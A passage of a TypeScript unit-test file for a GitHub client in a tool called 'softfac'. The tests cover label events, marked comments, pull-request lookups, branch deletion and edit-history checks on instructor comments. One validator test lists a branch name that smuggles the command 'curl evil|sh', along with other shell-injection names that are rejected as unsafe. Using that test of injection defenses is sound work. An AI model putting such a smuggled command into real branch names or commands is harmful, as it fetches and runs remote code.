    assert.deepStrictEqual(t.calls(), []);
  }),
);

it.effect("labeledAt is the newest label event of the state's label, one call each", () =>
  Effect.gen(function* () {
    const on = (at: string, label: string) => labelEvent("LabeledEvent", at, "rawphp", label);
    const history = eventsReply(
      [
        on(CREATED, "factory:triage"),
        on(LABELED, "factory:triage"),
        labelEvent("UnlabeledEvent", AFTER, "rawphp", "factory:triage"),
        on(AFTER, "factory:building"),
        on(LATER, "bug"),
      ],
      null,
      [],
    );
    const t = setup(reply(history), reply(history));
    assert.strictEqual(yield* t.ok(t.github.labeledAt(6, "triage")), LABELED);
    assert.strictEqual(yield* t.ok(t.github.labeledAt(6, "building")), AFTER);
    assert.deepStrictEqual(t.calls(), [historyCallFor(6), historyCallFor(6)]);
  }),
);

it.effect("labeledAt is null when the history has no label event of that label", () =>
  Effect.gen(function* () {
    const history = eventsReply(
      [labelEvent("LabeledEvent", LABELED, "rawphp", "factory:building")],
      null,
      [],
    );
    const t = setup(reply(history));
    assert.strictEqual(yield* t.ok(t.github.labeledAt(6, "triage")), null);
  }),
);

it.effect("newestFactoryComment is the newest marked comment, without the marker", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        '[{"id":1,"user":{"login":"rawphp"},"created_at":"2026-10-04T10:13:16Z","body":"first\\n\\n<!-- softfac -->"},{"id":2,"user":{"login":"eve"},"created_at":"2026-10-04T10:14:16Z","body":"a person"},{"id":3,"user":{"login":"rawphp"},"created_at":"2026-10-04T10:15:16Z","body":"status\\n\\n<!-- softfac:status -->"},{"id":4,"user":{"login":"rawphp"},"created_at":"2026-10-04T10:16:16Z","body":"newest\\r\\nline  \\r\\n\\r\\n<!-- softfac -->  \\n"}]',
      ),
    );
    const found = yield* t.ok(t.github.newestFactoryComment(6));
    assert.deepStrictEqual(found, { body: "newest\nline", createdAt: "2026-10-04T10:16:16Z" });
    assert.deepStrictEqual(t.calls(), [listCommentsCall]);
  }),
);

it.effect(
  "newestFactoryComment is null with no marked comment, and empty when GitHub gives no time",
  () =>
    Effect.gen(function* () {
      const t = setup(reply('[{"id":2,"user":{"login":"eve"},"body":"a person"}]'));
      assert.strictEqual(yield* t.ok(t.github.newestFactoryComment(6)), null);
      const t2 = setup(reply('[{"id":1,"user":null,"body":"x\\n<!-- softfac -->"}]'));
      assert.deepStrictEqual(yield* t2.ok(t2.github.newestFactoryComment(6)), {
        body: "x",
        createdAt: "",
      });
    }),
);

const readyByReply = (nodes: string) =>
  `{"data":{"repository":{"pullRequest":{"timelineItems":{"nodes":[${nodes}]}}}}}`;

it.effect("readyBy names the actor of the newest ready-for-review with one call", () =>
  Effect.gen(function* () {
    const t = setup(reply(readyByReply('{"actor":{"login":"alice"}}')));
    assert.strictEqual(yield* t.ok(t.github.readyBy(6)), "alice");
    assert.deepStrictEqual(t.calls(), [
      [
        "api",
        "graphql",
        "-f",
        `query=${READY_BY_QUERY}`,
        "-f",
        "owner=rawphp",
        "-f",
        "name=softfac",
        "-F",
        "number=6",
      ],
    ]);
  }),
);

it.effect("readyBy is null when it was never ready or has no actor", () =>
  Effect.gen(function* () {
    for (const nodes of ["", '{"actor":null}', "{}"]) {
      const t = setup(reply(readyByReply(nodes)));
      assert.strictEqual(yield* t.ok(t.github.readyBy(6)), null, nodes);
    }
  }),
);

it.effect("readyBy refuses an answer it cannot read", () =>
  Effect.gen(function* () {
    for (const text of ["", "no", "{}", '{"data":{"repository":{"pullRequest":null}}}']) {
      const t = setup(reply(text));
      const error = yield* t.err(t.github.readyBy(6));
      assert.strictEqual(error._tag, "GitHubParse", text);
    }
  }),
);

const closedByReply = (nodes: string) =>
  `{"data":{"repository":{"issue":{"timelineItems":{"nodes":[${nodes}]}}}}}`;

it.effect("closedBy names the actor of the newest closed event with one call", () =>
  Effect.gen(function* () {
    const t = setup(reply(closedByReply('{"actor":{"login":"alice"}}')));
    assert.strictEqual(yield* t.ok(t.github.closedBy(6)), "alice");
    assert.deepStrictEqual(t.calls(), [
      [
        "api",
        "graphql",
        "-f",
        `query=${CLOSED_BY_QUERY}`,
        "-f",
        "owner=rawphp",
        "-f",
        "name=softfac",
        "-F",
        "number=6",
      ],
    ]);
  }),
);

it.effect("closedBy is null when it was never closed or has no actor", () =>
  Effect.gen(function* () {
    for (const nodes of ["", '{"actor":null}', "{}"]) {
      const t = setup(reply(closedByReply(nodes)));
      assert.strictEqual(yield* t.ok(t.github.closedBy(6)), null, nodes);
    }
  }),
);

it.effect("closedBy refuses an answer it cannot read", () =>
  Effect.gen(function* () {
    for (const text of ["", "no", "{}", '{"data":{"repository":{"issue":null}}}']) {
      const t = setup(reply(text));
      const error = yield* t.err(t.github.closedBy(6));
      assert.strictEqual(error._tag, "GitHubParse", text);
    }
  }),
);

/** One pull request as GitHub lists it: open, by the factory, on `main`, unless `over` says otherwise. */
const listedPr = (
  number: number,
  over: Partial<{
    state: string;
    headRefName: string;
    baseRefName: string;
    isCrossRepository: boolean;
    author: { login: string } | null;
  }> = {},
) =>
  JSON.stringify({
    number,
    url: `https://github.com/rawphp/softfac/pull/${number}`,
    state: "OPEN",
    headRefName: `t3/pr-${number}`,
    baseRefName: "main",
    isCrossRepository: false,
    author: { login: "rawphp" },
    ...over,
  });

const closingReply = (nodes: string) =>
  `{"data":{"repository":{"issue":{"closedByPullRequestsReferences":{"nodes":[${nodes}]}}}}}`;

const PR_LIST_FIELDS = "number,url,headRefName,baseRefName,isCrossRepository,author";

it.effect(
  "openPullRequestsClosing lists the open pull requests that would close the issue, with one call",
  () =>
    Effect.gen(function* () {
      // GitHub's `includeClosedPrs: false` still returns merged ones: only `OPEN` is kept.
      const t = setup(
        reply(
          closingReply(
            [
              listedPr(12, { state: "MERGED" }),
              listedPr(14, { headRefName: "t3/softfac-issue-6-1" }),
              listedPr(13, { state: "CLOSED" }),
              listedPr(15, { headRefName: "t3/fork", isCrossRepository: true }),
              listedPr(16, { headRefName: "t3/nobody", baseRefName: "dev", author: null }),
            ].join(","),
          ),
        ),
      );
      assert.deepStrictEqual(yield* t.ok(t.github.openPullRequestsClosing(6)), [
        {
          number: 14,
          url: "https://github.com/rawphp/softfac/pull/14",
          headRef: "t3/softfac-issue-6-1",
          baseRef: "main",
          crossRepository: false,
          author: "rawphp",
        },
        {
          number: 15,
          url: "https://github.com/rawphp/softfac/pull/15",
          headRef: "t3/fork",
          baseRef: "main",
          crossRepository: true,
          author: "rawphp",
        },
        {
          number: 16,
          url: "https://github.com/rawphp/softfac/pull/16",
          headRef: "t3/nobody",
          baseRef: "dev",
          crossRepository: false,
          author: null,
        },
      ]);
      assert.deepStrictEqual(t.calls(), [
        [
          "api",
          "graphql",
          "-f",
          `query=${CLOSING_PRS_QUERY}`,
          "-f",
          "owner=rawphp",
          "-f",
          "name=softfac",
          "-F",
          "number=6",
        ],
      ]);
    }),
);

it.effect("openPullRequestsClosing is empty when nothing would close the issue", () =>
  Effect.gen(function* () {
    const t = setup(reply(closingReply("")));
    assert.deepStrictEqual(yield* t.ok(t.github.openPullRequestsClosing(6)), []);
  }),
);

it.effect("openPullRequestsClosing refuses an answer it cannot read", () =>
  Effect.gen(function* () {
    for (const text of ["", "no", "{}", '{"data":{"repository":{"issue":null}}}']) {
      const t = setup(reply(text));
      const error = yield* t.err(t.github.openPullRequestsClosing(6));
      assert.strictEqual(error._tag, "GitHubParse", text);
    }
  }),
);

const prListCall = (head: string) => [
  "pr",
  "list",
  "--repo",
  REPO,
  "--state",
  "open",
  "--head",
  head,
  "--limit",
  "100",
  "--json",
  PR_LIST_FIELDS,
];

it.effect(
  "openPullRequestsOnHead lists the open pull requests from the branch, with the exact call",
  () =>
    Effect.gen(function* () {
      // `gh pr list --json author` carries more than the login; a blank login is nobody.
      const t = setup(
        reply(
          `[${listedPr(14, { headRefName: "t3code/abc" })},${JSON.stringify({
            number: 15,
            url: "https://github.com/rawphp/softfac/pull/15",
            headRefName: "t3code/abc",
            baseRefName: "dev",
            isCrossRepository: true,
            author: { id: "", is_bot: false, login: "", name: "" },
          })}]`,
        ),
      );
      assert.deepStrictEqual(yield* t.ok(t.github.openPullRequestsOnHead("t3code/abc")), [
        {
          number: 14,
          url: "https://github.com/rawphp/softfac/pull/14",
          headRef: "t3code/abc",
          baseRef: "main",
          crossRepository: false,
          author: "rawphp",
        },
        {
          number: 15,
          url: "https://github.com/rawphp/softfac/pull/15",
          headRef: "t3code/abc",
          baseRef: "dev",
          crossRepository: true,
          author: null,
        },
      ]);
      assert.deepStrictEqual(t.calls(), [prListCall("t3code/abc")]);
    }),
);

it.effect("openPullRequestsOnHead is empty when the branch has none", () =>
  Effect.gen(function* () {
    const t = setup(reply("[]"));
    assert.deepStrictEqual(yield* t.ok(t.github.openPullRequestsOnHead("t3code/abc")), []);
  }),
);

it.effect(
  "openPullRequestsOnHead refuses a branch name that could be taken for an option, before calling gh",
  () =>
    Effect.gen(function* () {
      for (const head of ["-x", "--force", "a b", "a..b", "", "a\u0001b"]) {
        const t = setup(reply("[]"));
        const error = yield* t.err(t.github.openPullRequestsOnHead(head));
        assert.strictEqual(error._tag, "GitHubInvalidArgument", JSON.stringify(head));
        assert.deepStrictEqual(t.calls(), [], JSON.stringify(head));
      }
    }),
);

describe("the branch-name rules", () => {
  it("keep a plain ref name safe as one argument to git", () => {
    for (const name of ["t3code/abc", "feat/x;y", "t3/x`y`"]) assert.isTrue(isPlainRefName(name));
    for (const name of ["", "-x", "--force", "a b", "a..b", "a\u0001b", "a\tb"]) {
      assert.isFalse(isPlainRefName(name), JSON.stringify(name));
    }
  });

  it("let only an ordinary branch name into a command a session runs", () => {
    for (const name of ["t3code/abc", "t3/2e8db933", "feat/x_y-z.1"]) {
      assert.isTrue(isSafeBranchName(name), name);
    }
    for (const name of ["", "-x", "a b", "a..b", "feat/x;y", "t3/x`y`", "t3/x;$(curl evil|sh)"]) {
      assert.isFalse(isSafeBranchName(name), JSON.stringify(name));
    }
  });
});

it.effect("openPullRequestsOnHead refuses an answer it cannot read", () =>
  Effect.gen(function* () {
    for (const text of ["", "no", "{}", '[{"number":"x"}]']) {
      const t = setup(reply(text));
      const error = yield* t.err(t.github.openPullRequestsOnHead("t3code/abc"));
      assert.strictEqual(error._tag, "GitHubParse", text);
    }
  }),
);

/**
 * The `headPulls` answer for each head in order: its open pull requests, those open onto it, and
 * its ended ones.
 */
const headPullsReply = (
  heads: ReadonlyArray<{
    open: number;
    onto?: number;
    ended: ReadonlyArray<{ state: string; headRefOid: string; isCrossRepository: boolean }>;
  }>,
) =>
  JSON.stringify({
    data: {
      repository: Object.fromEntries(
        heads.flatMap((head, i) => [
          [`o${i}`, { totalCount: head.open }],
          [`b${i}`, { totalCount: head.onto ?? 0 }],
          [`e${i}`, { nodes: head.ended }],
        ]),
      ),
    },
  });

it.effect("headPulls reads the open and the ended pull requests of each head", () =>
  Effect.gen(function* () {
    const other = "1".repeat(40);
    const t = setup(
      reply(
        headPullsReply([
          { open: 1, ended: [] },
          // A stacked pull request onto the branch uses it as much as one from it.
          { open: 0, onto: 2, ended: [] },
          {
            open: 0,
            ended: [
              { state: "MERGED", headRefOid: BASE_SHA, isCrossRepository: false },
              { state: "CLOSED", headRefOid: other, isCrossRepository: false },
              // A fork's pull request from a branch of the same name is not this repo's.
              { state: "MERGED", headRefOid: other, isCrossRepository: true },
            ],
          },
        ]),
      ),
    );
    const pulls = yield* t.ok(t.github.headPulls(["t3/draft", "t3/base", "t3/done"]));
    assert.deepStrictEqual(
      pulls,
      new Map([
        ["t3/draft", { open: 1, ended: [] }],
        ["t3/base", { open: 2, ended: [] }],
        [
          "t3/done",
          {
            open: 0,
            ended: [
              { merged: true, headSha: BASE_SHA },
              { merged: false, headSha: other },
            ],
          },
        ],
      ]),
    );
    const [call] = t.calls();
    assert.deepStrictEqual(call!.slice(0, 2), ["api", "graphql"]);
    // The names travel as variables, never in the query text.
    assert.deepStrictEqual(call!.slice(4), [
      "-f",
      "owner=rawphp",
      "-f",
      "name=softfac",
      "-f",
      "h0=t3/draft",
      "-f",
      "h1=t3/base",
      "-f",
      "h2=t3/done",
    ]);
    const query = call![3]!;
    assert.notInclude(query, "t3/");
    // GitHub's OPEN state counts drafts too.
    assert.include(query, "o1: pullRequests(headRefName: $h1, states: OPEN, first: 1)");
    assert.include(query, "b1: pullRequests(baseRefName: $h1, states: OPEN, first: 1)");
  }),
);

it.effect("headPulls asks about 50 heads a call", () =>
  Effect.gen(function* () {
    const heads = Array.from({ length: 51 }, (_, i) => `t3/b${i}`);
    const none = { open: 0, ended: [] };
    const t = setup(
      reply(headPullsReply(Array.from({ length: 50 }, () => none))),
      reply(headPullsReply([none])),
    );
    const pulls = yield* t.ok(t.github.headPulls(heads));
    assert.strictEqual(pulls.size, 51);
    assert.deepStrictEqual(
      t.calls().map((call) => call.at(-1)),
      ["h49=t3/b49", "h0=t3/b50"],
    );
  }),
);

it.effect("headPulls refuses a name that is not a plain ref name, before calling gh", () =>
  Effect.gen(function* () {
    const t = setup(reply("{}"));
    const error = yield* t.err(t.github.headPulls(["t3/ok", "-x"]));
    assert.strictEqual(error._tag, "GitHubInvalidArgument");
    assert.deepStrictEqual(t.calls(), []);
  }),
);

it.effect("headPulls refuses an answer that lacks a head", () =>
  Effect.gen(function* () {
    const t = setup(reply(headPullsReply([{ open: 0, ended: [] }])));
    const error = yield* t.err(t.github.headPulls(["t3/a", "t3/b"]));
    assert.strictEqual(error._tag, "GitHubParse");
  }),
);

it.effect("deleteBranch deletes the branch with the exact call", () =>
  Effect.gen(function* () {
    const t = setup(reply(""));
    yield* t.ok(t.github.deleteBranch("t3/a b"));
    assert.deepStrictEqual(t.calls(), [
      ["api", "-X", "DELETE", "repos/rawphp/softfac/git/refs/heads/t3/a%20b"],
    ]);
  }),
);

it.effect("deleteBranch counts a branch already gone as deleted", () =>
  Effect.gen(function* () {
    const t = setup(fail(1, "gh: Reference does not exist (HTTP 422)"));
    yield* t.ok(t.github.deleteBranch("t3/gone"));
    const refused = setup(fail(1, "gh: Resource not accessible by integration (HTTP 403)"));
    assert.strictEqual(
      (yield* refused.err(refused.github.deleteBranch("t3/kept")))._tag,
      "GitHubFailed",
    );
  }),
);

const dropOf = (id: string, reason: DropReason): Dropped => ({ id, reason });
const argsOf = (error: GitHubError): ReadonlyArray<string> => ("args" in error ? error.args : []);

const ACT_SINCE = "2026-10-04T10:00:00Z";
const WRITTEN = "2026-10-04T10:01:00Z";
const EDIT_AT = "2026-10-04T10:20:00Z";

const commentsCall = [
  "api",
  `repos/rawphp/softfac/issues/6/comments?since=${ACT_SINCE}&per_page=100`,
  "--paginate",
];
const bodyEditCall = [
  "api",
  "graphql",
  "-f",
  `query=${ACTIVITY_QUERY}`,
  "-f",
  "owner=rawphp",
  "-f",
  "name=softfac",
  "-F",
  "number=6",
];
const editorCall = (...nodeIds: ReadonlyArray<string>) => [
  "api",
  "graphql",
  "-f",
  `query=${COMMENT_EDITOR_QUERY}`,
  ...nodeIds.flatMap((id) => ["-f", `ids[]=${id}`]),
];

/** A REST comment as `gh api repos/R/issues/N/comments` prints it. */
const restNode = (id: number, author: Who, at: string, body: string): Record<string, unknown> => ({
  id,
  user: author === null ? null : { login: author },
  node_id: `IC_${id}`,
  created_at: at,
  updated_at: at,
  body,
});
/** A comment that was edited after it was written. */
const editedRestNode = (
  id: number,
  author: string,
  created: string,
  updated: string,
  body: string,
): Record<string, unknown> => ({ ...restNode(id, author, created, body), updated_at: updated });
const restReply = (nodes: ReadonlyArray<Record<string, unknown>>) => JSON.stringify(nodes);

/** The issue's GraphQL answer with exactly these history nodes (newest first) and this total. */
const bodyReplyRaw = (body: string, last: Edit | null, nodes: ReadonlyArray<Edit>, total: number) =>
  JSON.stringify({
    data: {
      repository: {
        issue: {
          body,
          lastEditedAt: last === null ? null : last[0],
          editor: last === null ? null : actorOf(last[1]),
          userContentEdits: editsJson(nodes, total),
        },
      },
    },
  });
/** The issue's answer: the creation is the oldest entry of its history, the edit the newest. */
const activityBodyReply = (body: string, edited: Edit | null) => {
  const history: Array<Edit> = [[CREATED, "tom"]];
  if (edited !== null) history.push(edited);
  return bodyReplyRaw(body, edited, newestFirst(history), history.length);
};

/** A comment's editor lookup, history given newest first. */
const editorReplyRaw = (
  last: Edit | null,
  nodes: ReadonlyArray<Edit>,
  total: number,
  id = "IC_7",
) =>
  JSON.stringify({
    data: {
      nodes: [
        {
          id,
          lastEditedAt: last === null ? null : last[0],
          editor: last === null ? null : actorOf(last[1]),
          userContentEdits: editsJson(nodes, total),
        },
      ],
    },
  });
/** One lookup answer holding the nodes of several single-comment answers. */
const editorsReply = (...answers: ReadonlyArray<string>) =>
  JSON.stringify({
    data: {
      nodes: answers.flatMap(
        (answer) => (JSON.parse(answer) as { data: { nodes: Array<unknown> } }).data.nodes,
      ),
    },
  });
/** The lookup of a comment written by `tom` and last edited as `last`. */
const editorReply = (last: Edit | null, id = "IC_7") => {
  const history: Array<Edit> = [[CREATED, "tom"]];
  if (last !== null) history.push(last);
  return editorReplyRaw(last, newestFirst(history), history.length, id);
};
const editorReplyHistory = (last: Edit | null, oldestFirst: ReadonlyArray<Edit>) =>
  editorReplyRaw(last, newestFirst(oldestFirst), oldestFirst.length);

const activityOf = (t: ReturnType<typeof setup>, who: ReadonlyArray<string>) =>
  t.ok(t.github.activitySince(6, ACT_SINCE, who));
const idsOf = (activity: { readonly comments: ReadonlyArray<{ readonly id: string }> }) =>
  activity.comments.map((c) => c.id);

/** Whether an edited comment by `tom` survives, given the answer to the editor lookup. */
const keptAfter = (answer: string) =>
  Effect.gen(function* () {
    const t = setup(
      reply(restReply([editedRestNode(7, "tom", WRITTEN, EDIT_AT, "x")])),
      reply(answer),
      reply(activityBodyReply("b", null)),
    );
    // `amy` is an instructor too, so a history that names her is not refused for that.
    return (yield* activityOf(t, ["tom", "amy"])).comments.length > 0;
  });
/** What an edited comment by `tom` leaves out, with the reason, given the answer to the editor lookup. */
const droppedAfter = (answer: string) =>
  Effect.gen(function* () {
    const t = setup(
      reply(restReply([editedRestNode(7, "tom", WRITTEN, EDIT_AT, "x")])),
      reply(answer),
      reply(activityBodyReply("b", null)),
    );
    const activity = yield* activityOf(t, ["tom", "amy"]);
    assert.deepStrictEqual(activity.comments, [], "a dropped comment is not forwardable");
    return activity.dropped;
  });

it.effect("activity reads the real shapes and makes both calls", () =>
  Effect.gen(function* () {
    const realRest =
      '[{"id":5978910929,"user":{"login":"rawphp","id":1},"created_at":"2026-10-04T10:13:16Z","updated_at":"2026-10-04T10:13:16Z","body":"please use serde"}]';
    const realGraphql =
      '{"data":{"repository":{"issue":{"body":"Outcome text","lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":1,"nodes":[{"editedAt":"2026-10-04T09:50:06Z","editor":{"__typename":"User","login":"rawphp"}}]}}}}}';
    const t = setup(reply(realRest), reply(realGraphql));
    assert.deepStrictEqual(yield* activityOf(t, ["rawphp"]), {
      comments: [
        {
          id: "5978910929",
          author: "rawphp",
          createdAt: "2026-10-04T10:13:16Z",
          body: "please use serde",
        },
      ],
      bodyEdit: null,
      dropped: [],
    });
    assert.deepStrictEqual(t.calls(), [commentsCall, bodyEditCall]);
  }),
);

it.effect(
  "activity returns the comment and the body edit of an instructor, with the exact calls",
  () =>
    Effect.gen(function* () {
      const t = setup(
        reply(
          '[{"id":5,"node_id":"IC_5","user":{"login":"rawphp"},"created_at":"2026-10-04T10:13:17Z","updated_at":"2026-10-04T10:13:17Z","body":"hi"}]',
        ),
        reply(
          '{"data":{"repository":{"issue":{"body":"b","lastEditedAt":"2026-10-04T10:13:18Z","editor":{"__typename":"User","login":"rawphp"},"userContentEdits":{"totalCount":2,"nodes":[{"editedAt":"2026-10-04T10:13:18Z","editor":{"__typename":"User","login":"rawphp"}},{"editedAt":"2026-10-04T10:00:00Z","editor":{"__typename":"User","login":"rawphp"}}]}}}}}',
        ),
      );
      const activity = yield* t.ok(t.github.activitySince(6, "2026-10-04T10:13:16Z", ["rawphp"]));
      assert.deepStrictEqual(activity, {
        comments: [{ id: "5", author: "rawphp", createdAt: "2026-10-04T10:13:17Z", body: "hi" }],
        bodyEdit: { editedAt: "2026-10-04T10:13:18Z", editor: "rawphp", body: "b" },
        dropped: [],
      });
      const calls = t.calls();
      assert.strictEqual(calls.length, 2);
      assert.deepStrictEqual(calls[0], [
        "api",
        "repos/rawphp/softfac/issues/6/comments?since=2026-10-04T10:13:16Z&per_page=100",
        "--paginate",
      ]);
      assert.deepStrictEqual(calls[1]!.slice(0, 2), ["api", "graphql"]);
    }),
);

it("the activity query asks only for the body edit", () => {
  for (const field of [
    "body",
    "lastEditedAt",
    "body lastEditedAt editor { __typename login }",
    "userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } }",
    "$owner",
    "$name",
    "$number",
  ]) {
    assert.include(ACTIVITY_QUERY, field);
  }
  assert.notInclude(ACTIVITY_QUERY, "comments");
});

it("the comment editor query asks who last edited a comment by node id", () => {
  for (const part of [
    "$ids: [ID!]!",
    "nodes(ids: $ids)",
    "... on Comment { id lastEditedAt",
    "editor { __typename login }",
    "userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } }",
  ]) {
    assert.include(COMMENT_EDITOR_QUERY, part);
  }
});

it.effect("activity returns a comment that is only on a later page", () =>
  Effect.gen(function* () {
    const page1 = restReply([restNode(1, "tom", "2026-10-04T10:01:00Z", "first")]);
    const page2 = restReply([restNode(2, "tom", "2026-10-04T10:02:00Z", "second")]);
    // One array per page, as `gh api --paginate` may print them.
    const paged = setup(reply(`${page1}${page2}`), reply(activityBodyReply("b", null)));
    assert.deepStrictEqual(idsOf(yield* activityOf(paged, ["tom"])), ["1", "2"]);
    // One merged array.
    const merged = setup(
      reply(
        restReply([
          restNode(1, "tom", "2026-10-04T10:01:00Z", "first"),
          restNode(2, "tom", "2026-10-04T10:02:00Z", "second"),
        ]),
      ),
      reply(activityBodyReply("b", null)),
    );
    assert.deepStrictEqual(idsOf(yield* activityOf(merged, ["tom"])), ["1", "2"]);
  }),
);

it.effect("activity time boundary is exclusive", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        restReply([
          restNode(1, "tom", "2026-10-04T09:59:59Z", "before"),
          restNode(2, "tom", ACT_SINCE, "equal"),
          restNode(3, "tom", "2026-10-04T10:00:01Z", "after"),
        ]),
      ),
      reply(activityBodyReply("b", null)),
    );
    assert.deepStrictEqual(idsOf(yield* activityOf(t, ["tom"])), ["3"]);
  }),
);

it.effect("activity ignores a comment that was only edited after since", () =>
  Effect.gen(function* () {
    // The server filters on updated time; created_at must still be after `since`.
    const old = editedRestNode(1, "tom", "2026-10-04T09:00:00Z", "2026-10-04T10:30:00Z", "later");
    const t = setup(reply(restReply([old])), reply(activityBodyReply("b", null)));
    assert.deepStrictEqual((yield* activityOf(t, ["tom"])).comments, []);
    assert.strictEqual(t.calls().length, 2);
  }),
);

it.effect("activity keeps only instructors, case-insensitively", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        restReply([
          restNode(1, "TomKaczocha", "2026-10-04T10:01:00Z", "mixed case"),
          restNode(2, "stranger", "2026-10-04T10:02:00Z", "not one of ours"),
          restNode(3, "tomkaczocha-bot", "2026-10-04T10:03:00Z", "prefix only"),
        ]),
      ),
      reply(activityBodyReply("b", null)),
    );
    const activity = yield* activityOf(t, ["tomkaczocha"]);
    assert.deepStrictEqual(
      activity.comments.map((c) => [c.id, c.author]),
      [["1", "TomKaczocha"]],
    );
  }),
);

it.effect("activity with no instructors returns nothing", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(restReply([restNode(1, "tom", "2026-10-04T10:01:00Z", "hi")])),
      reply(activityBodyReply("b", ["2026-10-04T10:05:00Z", "tom"])),
    );
    const activity = yield* activityOf(t, []);
    assert.deepStrictEqual(activity.comments, []);
    assert.strictEqual(activity.bodyEdit, null);
  }),
);

it.effect("activity leaves out the factory's own comments, whoever wrote them", () =>
  Effect.gen(function* () {
    // The machine's user is also an instructor here, so authorship cannot tell them apart.
    const t = setup(
      reply(
        restReply([
          restNode(1, "tom", "2026-10-04T10:01:00Z", `a question\n\n${MARKER}`),
          restNode(2, "tom", "2026-10-04T10:02:00Z", `state\n\n${STATUS_MARKER}`),
          restNode(3, "tom", "2026-10-04T10:03:00Z", "a real instruction"),
        ]),
      ),
      reply(activityBodyReply("b", null)),
    );
    assert.deepStrictEqual(idsOf(yield* activityOf(t, ["tom"])), ["3"]);
  }),
);

it.effect("activity ignores deleted authors and lists the comments oldest first", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        restReply([
          restNode(3, "tom", "2026-10-04T10:03:00Z", "third"),
          restNode(4, null, "2026-10-04T10:04:00Z", "ghost"),
          restNode(1, "tom", "2026-10-04T10:01:00Z", "first"),
          restNode(2, "tom", "2026-10-04T10:02:00Z", "second"),
        ]),
      ),
      reply(activityBodyReply("b", null)),
    );
    assert.deepStrictEqual(idsOf(yield* activityOf(t, ["tom"])), ["1", "2", "3"]);
  }),
);

it.effect("an unedited comment costs no extra call", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(restReply([restNode(1, "tom", WRITTEN, "hi")])),
      reply(activityBodyReply("b", null)),
    );
    assert.deepStrictEqual(idsOf(yield* activityOf(t, ["tom"])), ["1"]);
    assert.deepStrictEqual(t.calls(), [commentsCall, bodyEditCall]);
  }),
);

it.effect("a comment edited by an instructor is kept after one extra call", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(restReply([editedRestNode(7, "tom", WRITTEN, EDIT_AT, "fixed")])),
      reply(editorReply([EDIT_AT, "Tom"])),
      reply(activityBodyReply("b", null)),
    );
    const activity = yield* activityOf(t, ["tom"]);
    assert.deepStrictEqual(idsOf(activity), ["7"]);
    assert.strictEqual(activity.comments[0]!.body, "fixed");
    assert.deepStrictEqual(t.calls(), [commentsCall, editorCall("IC_7"), bodyEditCall]);
  }),
);

it.effect("the real comment edit history shape is read", () =>
  Effect.gen(function* () {
    const real =
      '{"data":{"nodes":[{"id":"IC_7","lastEditedAt":"2026-10-04T10:20:00Z","editor":{"__typename":"User","login":"rawphp"},"userContentEdits":{"totalCount":2,"nodes":[{"editedAt":"2026-10-04T10:20:00Z","editor":{"__typename":"User","login":"rawphp"}},{"editedAt":"2026-10-04T10:01:00Z","editor":{"__typename":"User","login":"rawphp"}}]}}]}}';
    const t = setup(
      reply(restReply([editedRestNode(7, "rawphp", WRITTEN, EDIT_AT, "x")])),
      reply(real),
      reply(activityBodyReply("b", null)),
    );
    assert.deepStrictEqual(idsOf(yield* activityOf(t, ["rawphp"])), ["7"]);
  }),
);

it.effect(
  "a comment edited by a non-instructor or a deleted account is dropped as edited by someone else",
  () =>
    Effect.gen(function* () {
      // A collaborator with write access can edit an instructor's comment.
      const t = setup(
        reply(
          restReply([
            editedRestNode(7, "tom", WRITTEN, EDIT_AT, "rewritten"),
            restNode(8, "tom", "2026-10-04T10:02:00Z", "plain"),
          ]),
        ),
        reply(editorReply([EDIT_AT, "stranger"])),
        reply(activityBodyReply("b", null)),
      );
      const activity = yield* activityOf(t, ["tom"]);
      assert.deepStrictEqual(idsOf(activity), ["8"]);
      assert.deepStrictEqual(activity.dropped, [dropOf("7", "edited-by-other")]);
      assert.deepStrictEqual(yield* droppedAfter(editorReply([EDIT_AT, null])), [
        dropOf("7", "edited-by-other"),
      ]);
    }),
);

it.effect(
  "a comment any non-instructor edited is dropped, though an instructor edited it last",
  () =>
    Effect.gen(function* () {
      // There is no `since` here: the comment is the instructor's own text from the start.
      const other = [dropOf("7", "edited-by-other")];
      assert.deepStrictEqual(
        yield* droppedAfter(
          editorReplyHistory(
            [EDIT_AT, "tom"],
            [
              ["2026-10-04T09:00:00Z", "stranger"],
              [EDIT_AT, "tom"],
            ],
          ),
        ),
        other,
      );
      assert.deepStrictEqual(
        yield* droppedAfter(
          editorReplyHistory(
            [EDIT_AT, "tom"],
            [
              ["2026-10-04T10:05:00Z", "tom"],
              ["2026-10-04T10:10:00Z", "stranger"],
              [EDIT_AT, "tom"],
            ],
          ),
        ),
        other,
      );
      assert.deepStrictEqual(
        yield* droppedAfter(
          editorReplyHistory(
            [EDIT_AT, "tom"],
            [
              ["2026-10-04T10:05:00Z", null],
              [EDIT_AT, "tom"],
            ],
          ),
        ),
        other,
      );
      // The page shows the stranger's edit, so the length does not hide it.
      assert.deepStrictEqual(
        yield* droppedAfter(
          editorReplyRaw(
            [EDIT_AT, "tom"],
            [
              [EDIT_AT, "tom"],
              ["2026-10-04T10:10:00Z", "stranger"],
            ],
            150,
          ),
        ),
        other,
      );
    }),
);

it.effect("a comment only instructors edited, or never edited, is kept", () =>
  Effect.gen(function* () {
    assert.isTrue(
      yield* keptAfter(
        editorReplyHistory(
          [EDIT_AT, "Tom"],
          [
            ["2026-10-04T10:05:00Z", "tom"],
            [EDIT_AT, "Tom"],
          ],
        ),
      ),
    );
    // `lastEditedAt` null, with an empty history or with only the creation entry.
    assert.isTrue(yield* keptAfter(editorReplyHistory(null, [])));
    assert.isTrue(yield* keptAfter(editorReplyHistory(null, [[CREATED, "tom"]])));
    // `updated_at` also moves for reasons other than the body: GitHub then has no edit.
    assert.isTrue(yield* keptAfter(editorReply(null)));
  }),
);

it.effect("a history too long to check drops the comment as unverifiable", () =>
  Effect.gen(function* () {
    const times = Array.from(
      { length: 100 },
      (_, i) => `2026-10-04T10:${pad(2 + Math.floor(i / 60))}:${pad(i % 60)}Z`,
    );
    const edits = (n: number): Array<Edit> => times.slice(0, n).map((t): Edit => [t, "tom"]);
    // 99 entries are whole; a full page may hide more.
    assert.isTrue(yield* keptAfter(editorReplyHistory([times[98]!, "tom"], edits(99))));
    assert.deepStrictEqual(
